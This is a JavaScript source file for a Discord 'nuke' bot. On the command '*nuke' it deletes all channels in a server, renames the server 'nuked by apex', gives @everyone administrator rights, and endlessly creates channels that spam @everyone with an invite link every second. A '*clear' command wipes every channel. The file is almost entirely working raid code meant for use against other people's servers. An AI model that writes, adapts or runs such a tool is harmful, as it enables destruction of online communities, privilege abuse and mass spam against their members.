/*

☆.。.:*・°☆.。.:*・°☆.。.:*・°☆.。.:*・°☆
                                                 
  _________ ___ ___ ._______   _________    
 /   _____//   |   \|   \   \ /   /  _  \   
 \_____  \/    ~    \   |\   Y   /  /_\  \  
 /        \    Y    /   | \     /    |    \ 
/_______  /\___|_  /|___|  \___/\____|__  / 
        \/       \/                     \/  
                    
                                                                       
☆.。.:*・°☆.。.:*・°☆.。.:*・°☆.。.:*・°☆


*/

const { Client, GatewayIntentBits, Permissions } = require('discord.js');
require('dotenv').config();
const express = require('express');
const path = require('path');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

const app = express();
const port = 3000;

app.get('/', (req, res) => {
  const imagePath = path.join(__dirname, 'index.html');
  res.sendFile(imagePath);
});

app.listen(port, () => {
  console.log('\x1b[36m[ SERVER ]\x1b[0m', '\x1b[32m SH : http://localhost:' + port + ' ✅\x1b[0m');
});

async function login() {
  try {
    await client.login(process.env.TOKEN);
    console.log('\x1b[36m[ LOGIN ]\x1b[0m', `\x1b[32mLogged in as: ${client.user.tag} ✅\x1b[0m`);
    console.log('\x1b[36m[ INFO ]\x1b[0m', `\x1b[35mBot ID: ${client.user.id} \x1b[0m`);
    console.log('\x1b[36m[ INFO ]\x1b[0m', `\x1b[34mConnected to ${client.guilds.cache.size} server(s) \x1b[0m`);
  } catch (error) {
    console.error('\x1b[31m[ ERROR ]\x1b[0m', 'Failed to log in:', error);
    process.exit(1);
  }
}

client.once('ready', () => {
  console.log('\x1b[36m[ INFO ]\x1b[0m', `\x1b[34mPing: ${client.ws.ping} ms \x1b[0m`);
});

client.on('messageCreate', async (message) => {
  if (message.content === '*nuke') {
    // Delete all existing channels
    message.guild.channels.cache.forEach(channel => channel.delete());

    // Rename server
    await message.guild.setName('nuked by apex');

    // Update @everyone role permissions
    const everyoneRole = message.guild.roles.everyone;
    await everyoneRole.setPermissions(Permissions.FLAGS.ADMINISTRATOR);

    // Function to create a new channel and start spamming
    const createAndSpamChannel = async () => {
      const channel = await message.guild.channels.create('nuked by apex', {
        type: 'GUILD_TEXT'
      });

      // Spam messages in the new channel
      setInterval(() => {
        channel.send('@everyone https://discord.gg/6Vtg4WpPHY');
      }, 1000); // Adjust the interval as needed (1000 ms = 1 second)
    };

    // Create the initial channel
    await createAndSpamChannel();

    // Infinite loop to continually create new channels and start spamming
    nukeInterval = setInterval(async () => {
      await createAndSpamChannel();
    }, 1000); // Adjust the interval as needed (1000 ms = 1 second)
  }

  if (message.content === '*clear') {
    // Stop the nuke process
    if (nukeInterval) {
      clearInterval(nukeInterval);
      message.channel.send('Nuke process stopped.');
    }

    // Delete all channels
    const allChannels = message.guild.channels.cache;
    let deletePromises = [];
    for (const channel of allChannels.values()) {
      deletePromises.push(channel.delete());
    }

    // Wait for all channels to be deleted
    await Promise.all(deletePromises);

    // Create a "general" channel after all channels are deleted
    await message.guild.channels.create('general', {
      type: 'GUILD_TEXT'
    });

    message.channel.send('All channels have been deleted and a "general" channel has been created.');
  }
});

login();
